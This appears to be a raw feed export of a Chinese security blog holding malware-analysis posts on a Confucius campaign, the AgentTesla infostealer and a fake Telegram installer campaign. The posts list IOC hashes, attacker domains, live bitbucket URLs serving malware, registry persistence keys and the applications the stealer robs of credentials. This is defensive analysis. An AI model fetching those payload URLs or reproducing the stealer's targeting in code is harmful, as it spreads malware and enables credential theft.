42fcb2df6376636e3dbea9236cdd768eacea50771fdab42ec5971310dce3bddd9c311b68090f5ec8771aa83a39688233</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA1</span> <span class="attr">hash</span>: 782ac9aa349761133f2d23c5bc85154015f83552</span><br><span class="line"></span><br><span class="line"><span class="title class_">MD5</span> <span class="attr">hash</span>: 43c16a3c557cadce8a74c418e683a32b</span><br><span class="line"></span><br><span class="line"><span class="title class_">File</span> <span class="attr">name</span>:skfk.<span class="property">txt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第二阶段<span class="variable constant_">DLL</span></span><br><span class="line"><span class="title class_">SHA256</span> <span class="attr">hash</span>: 63ca532a13ff909b4b7f72b9a094fa3fc59713984f645664c95a66f14be5f96a</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA3</span>-<span class="number">384</span> <span class="attr">hash</span>: 304115c758244ca546ea7d068d2417b7129a4f23244e0e2865f47cbda4330497a58df513e02a8ebc6f53227e6ca7c82f</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA1</span> <span class="attr">hash</span>: 33596fbe26e556bb2610739f070b66a2cf532eda</span><br><span class="line"></span><br><span class="line"><span class="title class_">MD5</span> <span class="attr">hash</span>: 4461412acfc3988974355d4c1601d3f6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第三阶段<span class="variable constant_">DLL</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA256</span> <span class="attr">hash</span>: f10541d934aa04fdd82839b1d1767489191fcecc6026ca5e12a19e9c84562b19</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA3</span>-<span class="number">384</span> <span class="attr">hash</span>: 0de64dce3576c1705d4da6bbd02753ce586858b54c2735a944756a79fbf77b0f4c722f48d37b2875e127fe11b804955d</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA1</span> <span class="attr">hash</span>: 7ff732a7361234eef8b340816cdd782d21c84c53</span><br><span class="line"></span><br><span class="line"><span class="title class_">MD5</span> <span class="attr">hash</span>: 8696a6256cb49aa1527d74f175346594</span><br><span class="line"></span><br><span class="line"><span class="title class_">File</span> <span class="attr">name</span>:<span class="title class_">Msdjkfh</span>.<span class="property">bin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">第四阶段<span class="variable constant_">DLL</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA256</span> <span class="attr">hash</span>: 43698d70087aa875c4384b59cacd8eff56bd0bff3be20e69b98613ec5184b41f</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA3</span>-<span class="number">384</span> <span class="attr">hash</span>: </span><br><span class="line">dd193b7091679d69fdd33ddb20a13702b70604e8eac078473a867548ed2893b2e820ba9860f2c29487f66680ba784874</span><br><span class="line"></span><br><span class="line"><span class="title class_">SHA1</span> <span class="attr">hash</span>: e554c0ef069fe5a49919bea560003cfccd69f858</span><br><span class="line"></span><br><span class="line"><span class="title class_">MD5</span> <span class="attr">hash</span>: 457101ea5c30c53f9381d7e9aa6432a4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">托管恶意文档的服务器</span><br><span class="line"></span><br><span class="line">parinari[.]xyz</span><br><span class="line"></span><br><span class="line">用于文件泄露的服务器</span><br><span class="line"></span><br><span class="line">pirnaram[.]xyz</span><br></pre></td></tr></table></figure><p>参考链接：<code>ttps://www.trendmicro.com/en_us/research/21/h/confucius-uses-pegasus-spyware-related-lures-to-target-pakistani.html</code><br><code>https://twitter.com/h2jazi/status/1439633168219480076</code><br><code>https://bazaar.abuse.ch/browse/tag/Confucius/</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/learn-c-start-designing-games-apps.1280x600.jpg&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="windows" scheme="https://www.ggsec.cn/categories/windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Windows" scheme="https://www.ggsec.cn/tags/Windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>decrypting-obfuscated-net-malware-part-2</title>
    <link href="https://www.ggsec.cn/decrypting-obfuscated-net-malware-part-2.html"/>
    <id>https://www.ggsec.cn/decrypting-obfuscated-net-malware-part-2.html</id>
    <published>2021-09-04T23:45:07.000Z</published>
    <updated>2022-11-25T12:57:10.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/97ED5073471E2C9EFAC6706C7C6246EC.jpg"></p><span id="more"></span><p>信息窃取者agenttesla</p><h2 id="1-收集用户系统数据"><a href="#1-收集用户系统数据" class="headerlink" title="1.收集用户系统数据"></a>1.收集用户系统数据</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">时间、用户、<span class="meta">CPU</span>、内存、计算机名称、OSFullName</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630805895828.png"></p><h2 id="2-从这些l浏览器列表中中窃取凭据"><a href="#2-从这些l浏览器列表中中窃取凭据" class="headerlink" title="2.从这些l浏览器列表中中窃取凭据"></a>2.从这些l浏览器列表中中窃取凭据</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Opera, Comodo, Google Chrome, CocCoc, Chedot, Elements <span class="keyword">Browser, </span>Liebao, QIP Surf, <span class="keyword">Orbitum, </span>Sputnik, CentBrowser, Amigo, SRWare Iron, Torch, <span class="keyword">Brave, </span>Iridium, CoolNovo, <span class="number">7</span>Star, Epic Privacy <span class="keyword">Browser, </span><span class="number">360</span> Chrome, Yandex, QQBrowser , UCBrowser, Kometa, Sleipnir <span class="number">6</span>, Citrio, Coowon, uCozMedia, Vivaldi, Cyber​​Fox, IceCat, PaleMoon, Falkon <span class="keyword">Browser, </span>Flock <span class="keyword">Browser, </span>WaterFox, <span class="keyword">BlackHawk</span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630805314641.png"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630805833614.png"></p><h2 id="3-FTP应用列表窃取凭据"><a href="#3-FTP应用列表窃取凭据" class="headerlink" title="3.FTP应用列表窃取凭据"></a>3.FTP应用列表窃取凭据</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CoreFTP、SmartFTP、WS_FTP、FileZilla、cftp、FTPCommander、FTPGetter、WinScp 2、FlashFXP、FTP Navigator</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630806127946.png"></p><h2 id="4-邮箱信息窃取"><a href="#4-邮箱信息窃取" class="headerlink" title="4.邮箱信息窃取"></a>4.邮箱信息窃取</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">IncrediMail</span>, <span class="title class_">Eudora</span>, <span class="title class_">Postbox</span>, <span class="title class_">ClawsMail</span>, <span class="title class_">ThunderBird</span>, <span class="title class_">TheBat</span>, <span class="title class_">Outlook</span>, <span class="title class_">OperaMail</span>, <span class="title class_">Pocomail</span>, <span class="title class_">Foxmail</span>, <span class="title class_">Psi</span>+</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630806442234.png"></p><h2 id="5-聊天和消息应用程序"><a href="#5-聊天和消息应用程序" class="headerlink" title="5.聊天和消息应用程序"></a>5.聊天和消息应用程序</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Paltalk</span> Pidgin，Trillian</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630806630346.png" alt="Paltalk Pidgin"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630806659967.png" alt="Trillian"></p><h2 id="6-DNS-和-VPN-服务"><a href="#6-DNS-和-VPN-服务" class="headerlink" title="6.DNS 和 VPN 服务"></a>6.DNS 和 VPN 服务</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">DynDNS</span>、<span class="title class_">Vitalwerks</span>、<span class="title class_">OpenVPN</span>-<span class="variable constant_">GUI</span>、<span class="title class_">OpenVPN</span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630808163184.png"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630808182848.png"></p><h2 id="7-下载器"><a href="#7-下载器" class="headerlink" title="7.下载器"></a>7.下载器</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630806867295.png"></p><h2 id="8-攻击者其他信息"><a href="#8-攻击者其他信息" class="headerlink" title="8.攻击者其他信息"></a>8.攻击者其他信息</h2><p>该恶意软件使用 SMTP&#x2F;FTP&#x2F;WebPanel 来窃取被盗数据。</p><h3 id="8-1攻击者-SMTP-凭据"><a href="#8-1攻击者-SMTP-凭据" class="headerlink" title="8.1攻击者 SMTP 凭据"></a>8.1攻击者 SMTP 凭据</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630807143464.png"></p><h3 id="8-2-可疑网页面板"><a href="#8-2-可疑网页面板" class="headerlink" title="8.2 可疑网页面板"></a>8.2 可疑网页面板</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630807338520.png" alt="enter description here"></p><h3 id="8-3可疑的FTP-连接"><a href="#8-3可疑的FTP-连接" class="headerlink" title="8.3可疑的FTP 连接"></a>8.3可疑的FTP 连接</h3><p> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630807526907.png"></p><h2 id="9-捕获屏幕截图和键盘记录"><a href="#9-捕获屏幕截图和键盘记录" class="headerlink" title="9.捕获屏幕截图和键盘记录"></a>9.捕获屏幕截图和键盘记录</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630807719510.png"></p><h2 id="10-持久化"><a href="#10-持久化" class="headerlink" title="10.持久化"></a>10.持久化</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WNRUXJ</span><br><span class="line">Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\\WNRUXJ</span><br><span class="line">%TEMP%\\tmpG[0–9]&#123;3&#125;</span><br></pre></td></tr></table></figure><h2 id="IOC如下"><a href="#IOC如下" class="headerlink" title="IOC如下"></a>IOC如下</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">lbIDo.exe 初始</span><br><span class="line"></span><br><span class="line">md5B163247FED5C1014F69E72C230235A22</span><br><span class="line">sha14F0F616DCEAA489E0CE112B02603DBC5D9540C07</span><br><span class="line">sha256BEC429A1F10445FA8ABA7DC9A4103BBAE69D5470C514221A0A87E6B9262CCC6A</span><br><span class="line"></span><br><span class="line">https://www.virustotal.com/gui/file/bec429a1f10445fa8aba7dc9a4103bbae69d5470c514221a0a87e6b9262ccc6a/details</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AndroidStudio.dll stager 1</span><br><span class="line"></span><br><span class="line">MD589cae80db18a87076fb59c2deff65b66</span><br><span class="line">SHA-18ba977317f5c661f81f5317f32ba50d3e8a129ba</span><br><span class="line">SHA-2564f717aaa0558a7bad3c9eb8d68d7e52a262670898586b4daaf1c0871ef1e1533</span><br><span class="line"></span><br><span class="line">https://www.virustotal.com/gui/file/4f717aaa0558a7bad3c9eb8d68d7e52a262670898586b4daaf1c0871ef1e1533/details</span><br><span class="line"></span><br><span class="line">Lazarus.exe stager 2</span><br><span class="line"></span><br><span class="line">MD50e4f9e496a1315780640d181cc3b9833</span><br><span class="line">SHA-132b1ba9d9b557abf88d09ebda9fc2e4073775792</span><br><span class="line">SHA-2565bb43d179f782e2e0df0a45c89876693e9c71ba5b69770305c9264bbb566c379</span><br><span class="line"></span><br><span class="line">https://www.virustotal.com/gui/file/5bb43d179f782e2e0df0a45c89876693e9c71ba5b69770305c9264bbb566c379/details</span><br><span class="line"></span><br><span class="line">NRMOeaUVVkwIAtJShsOH.exe 解密的字符串stager 3</span><br><span class="line"></span><br><span class="line">md54EF4497EC0AE0C98135E667E2A119DF4</span><br><span class="line">sha18665A6D4C44939B03E5E384B15B635A2914BE954</span><br><span class="line">sha256D26EB5E5EACB571F650A7991A4746FB4B785C8C625D36E8F0019A90B48855ACD</span><br><span class="line"></span><br><span class="line">DNS请求 </span><br><span class="line">域名 smtp.yandex.com</span><br></pre></td></tr></table></figure><p>参考链接：<a href="https://ghoulsec.medium.com/mal-series-9-c-agenttesla-infostealer-430d8cac505e">https://ghoulsec.medium.com/mal-series-9-c-agenttesla-infostealer-430d8cac505e</a><br><a href="https://www.youtube.com/watch?v=8L4hh5CG4nQ&t=364s">https://www.youtube.com/watch?v=8L4hh5CG4nQ&amp;t=364s</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/97ED5073471E2C9EFAC6706C7C6246EC.jpg&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="windows" scheme="https://www.ggsec.cn/categories/windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Windows" scheme="https://www.ggsec.cn/tags/Windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>decrypting-obfuscated-net-malware-part1</title>
    <link href="https://www.ggsec.cn/decrypting-obfuscated-net-malware-part-1.html"/>
    <id>https://www.ggsec.cn/decrypting-obfuscated-net-malware-part-1.html</id>
    <published>2021-09-04T01:53:17.000Z</published>
    <updated>2022-11-25T12:56:59.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/97ED5073471E2C9EFAC6706C7C6246EC.jpg"></p><span id="more"></span><h2 id="1-起因"><a href="#1-起因" class="headerlink" title="1.起因"></a>1.起因</h2><p>今天正好抽空整理一下前几个月看到阿三的分析视频。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630721969956.png"><br><a href="https://app.any.run/tasks/0f9b13ab-3efe-4ee1-abc1-a193db2bc33e/">https://app.any.run/tasks/0f9b13ab-3efe-4ee1-abc1-a193db2bc33e/</a></p><p> AgentTesla该恶意样本具有 3 层混淆和少量反分析技术的信息窃取器能够通过通过 SMTP 发送所有收集到的信息来窃取受害者的各种信息。<br>stager 的名称：</p><ol><li>IbIDo（包含有payload2 和 3 的加密stager）</li><li>AndroidStudio（解密payload 3）</li><li>Lazarus（最终payload之前包含少量反分析技术）</li><li>NRMOeaUVVkwIAtJShsOH（最终 AgentTesla payload)</li><li><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630741271800.png"><br>下面我们就开始分析各个阶段的stager</li></ol><h2 id="2-IbIDo"><a href="#2-IbIDo" class="headerlink" title="2.IbIDo"></a>2.IbIDo</h2><p> 拖入MV TBN CALL PORT FOR LOADING COAL_pdf.exe到pestudiom，可以看到在version种可以看到信息lbIDo.exe<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630722738659.png"><br> 再使用dnspy反编译调试工具进行分析与调试，找到ibiDO，进入man函数</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630724884619.png" alt=" "><br>跟进去找到main窗口，可以看到两个字符串<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630729629274.png"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630729736047.png"><br>那么我们回来再看看这个Secure1函数，双击跟进去看看。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630733493584.png"><br>在这我们可以看到资源的wpf像是做了base64解密，然后替换了字符串以及字符串翻转。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630733632696.png"><br>我们接着跟进到资源处，可以看到处理过的字符串<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630733843967.png"><br>那么我们对其使用CyberChef解密。得出第二阶段的payload。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630734057491.png"><br>或在此处调试进行保存二进制文件即可<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630734183152.png"><br>可以看到调用该第二阶段的payload的类<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630734288828.png"></p><h2 id="3-AndroidStudio"><a href="#3-AndroidStudio" class="headerlink" title="3.AndroidStudio"></a>3.AndroidStudio</h2><p>我们可以看到到处保存的二进制文件为dll，同时也是C#编译的<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630734572318.png"><br>继续进行分离payload的，在此处下的断点，运行后，快速进行暂停。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630734943688.png"><br>停了之后，可以看到这里有个sleep函数，在该函数这里下个断点,然后步过<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630735751724.png"><br>我们在左侧可以看到调用的dll，然后我们依次进行步过<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630736332550.png"><br>只到788行进行单步，跟进去，再步过。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630738394045.png"><br>单步后，可以看到array处熟悉pe头<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630738476976.png"><br>保存导出使用pestudioj进行查看，发现是个exe文件，依旧还是c#编译的<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630738668203.png"></p><h2 id="4-Lazarus"><a href="#4-Lazarus" class="headerlink" title="4.Lazarus"></a>4.Lazarus</h2><p>拖入dnspy种发现混淆比较严重。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630738916020.png"><br>使用de4dot工具,进行脱壳反混淆操作<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630739092376.png"><br>处理完混淆后的文件之后，我们进入main函数主体<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630739250664.png"><br>下断点，然后一直步过。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630739458038.png"><br>直到这里，进行单步。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630739536417.png"><br>直到这里，进行单步。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630739653415.png"><br>一直到这里，我们可以看到又是一个pe头。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630739874834.png"><br>保存导出使用pestudioj进行查看，发现是个exe文件，依旧还是c#编译的，也是为最终 AgentTesla payload。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630740068392.png"></p><h2 id="5-NRMOeaUVVkwIAtJShsOH"><a href="#5-NRMOeaUVVkwIAtJShsOH" class="headerlink" title="5.NRMOeaUVVkwIAtJShsOH"></a>5.NRMOeaUVVkwIAtJShsOH</h2><p>依旧拖入dnspy，查看main主体<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630740282022.png"><br>在浏览代码时，我发现了很多对函数的引用’Module&gt;.\u0005’<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630740443762.png"><br>看一下函数的定义，如下所示，表明它接受一个整数作为输入并返回一个字符串。所以混淆器在运行时使用这个函数来解码字符串。注意0x060000002我们在解密字符串时需要它的函数的令牌标识符。（单击红框处的module）<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630740619710.png"><br>现在切换到命令行并发出以下命令</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">de4dot<span class="selector-class">.exe</span> <span class="number">1</span><span class="selector-class">.exe</span> <span class="attr">--strtyp</span> emulate <span class="attr">--strtok</span> <span class="number">0</span>x06000002</span><br></pre></td></tr></table></figure><p>–strtoki是我们上面确定的字符串解密函数的令牌。如果恶意软件使用多个函数来解密字符串，像这样指定所有函数</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">de4dot file1.dll --strtyp delegate --strtok <span class="number">06012345</span> --strtok <span class="number">060</span>ABCDE</span><br></pre></td></tr></table></figure><p>其中–strtyp是要使用的字符串解密器的类型。de4dot 支持以下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">字符串解密器类型</span><br><span class="line">none 不要解密字符串</span><br><span class="line">default 使用默认的字符串解密器类型（通常是静态的）</span><br><span class="line">static 使用静态字符串解密器（如果可用）</span><br><span class="line">delegate 使用delegate调用真正的字符串解密器</span><br><span class="line">emulate 调用真正的字符串解密器并模拟某些指令</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630740911497.png"><br>处理完毕的文件内容<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630740969581.png"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1630741029792.png"><br><strong>参考链接</strong>：<a href="https://www.youtube.com/watch?v=8L4hh5CG4nQ&t=1s">https://www.youtube.com/watch?v=8L4hh5CG4nQ&amp;t=1s</a><br><a href="https://medium.com/@irshaduetian/decrypting-obfuscated-net-malware-strings-using-de4dot-emulation-6614c5a03dab">https://medium.com/@irshaduetian/decrypting-obfuscated-net-malware-strings-using-de4dot-emulation-6614c5a03dab</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://demonsec666.oss-cn-qingdao.aliyuncs.com/97ED5073471E2C9EFAC6706C7C6246EC.jpg&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="windows" scheme="https://www.ggsec.cn/categories/windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/categories/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Windows" scheme="https://www.ggsec.cn/tags/Windows/"/>
    
    <category term="恶意样本分析" scheme="https://www.ggsec.cn/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Telegram恶意广告活动之恶意仓库分析</title>
    <link href="https://www.ggsec.cn/Telegram%E6%81%B6%E6%84%8F%E5%B9%BF%E5%91%8A%E6%B4%BB%E5%8A%A8%E4%B9%8B%E6%81%B6%E6%84%8F%E4%BB%93%E5%BA%93%E5%88%86%E6%9E%90.html"/>
    <id>https://www.ggsec.cn/Telegram%E6%81%B6%E6%84%8F%E5%B9%BF%E5%91%8A%E6%B4%BB%E5%8A%A8%E4%B9%8B%E6%81%B6%E6%84%8F%E4%BB%93%E5%BA%93%E5%88%86%E6%9E%90.html</id>
    <published>2021-03-19T10:34:14.000Z</published>
    <updated>2022-11-25T12:55:55.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-24.jpg" alt="1"></p><span id="more"></span><h3 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h3><p>Jeremy Kirk博主表示在搜索telegram的时候发现有一个有趣的广告</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-1.png" alt="1"></p><p>访问链接后，看起来像是telegram的官方网站，做的很逼真，但是其实就是钓鱼网站，当我们查看链接时，我们发现它用恶意软件替换了Windows二进制文件：</p><p>指向第三方的链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/TelegramInstaller.exe</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-2.png" alt="2"></p><p>查看证书，我们可以看到它们是由相同的CA在相同的时间范围内颁发的，这很可能使它们来自同一威胁参与者。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://telegramdesktop.com/</span><br><span class="line">https://telegramdesktop.net/</span><br><span class="line">https://telegramdesktop.org/</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-3.png" alt="33"></p><p>当然在博主发完博文的后，我再次查看该网站，发现了它对链接也进行了替换。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-4.png" alt="4"></p><h3 id="2-bitbucker发现"><a href="#2-bitbucker发现" class="headerlink" title="2.bitbucker发现"></a>2.bitbucker发现</h3><p>在.com网站将其文件分发到bitbucker仓库中（github替代品）。访问仓库时，我们可以收集有关感染，操作日期以及其他恶意软件样本的一些信息：</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/20210319-5.png" alt="5"></p><p>在该仓库发现如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/get/31a6a41f7711.zip</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/TelegramInstaller.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/Crycker.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/TelegramInstallerX86.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/RuntimeBroker.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/rxr.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/zxc.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/SoftwareUpdate.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/Discord_x86_Setup.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/TGInstaller.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/TGInstaller.scr</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/DRX.exe</span><br><span class="line">https://bitbucket.org/LLCTRUST/softwarellc/downloads/SmartScreenUpdater.exe</span><br></pre></td></tr></table></figure><h3 id="3-powershell脚本分析"><a href="#3-powershell脚本分析" class="headerlink" title="3.powershell脚本分析"></a>3.powershell脚本分析</h3><p>同时在该仓库中发现一个提交者的仓库。</p><p><strong>本文就着重讲解在该提交者的仓库中的链接，我们从bat脚本更好的去入手分析</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://bitbucket.org/takax/1/downloads/TGInstaller.rar</span><br><span class="line">https://bitbucket.org/takax/1/downloads/TelegramInstaller.rar</span><br><span class="line">https://bitbucket.org/takax/1/downloads/RDP.exe</span><br><span class="line">https://bitbucket.org/takax/1/downloads/TelegramInstaller.exe</span><br><span class="line">https://bitbucket.org/takax/1/downloads/clr.exe</span><br><span class="line">https://bitbucket.org/takax/1/downloads/12.bat</span><br></pre></td></tr></table></figure><h4 id="3-1-bat"><a href="#3-1-bat" class="headerlink" title="3.1 bat"></a>3.1 bat</h4><p>运行bat后，下载执行powershel脚本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 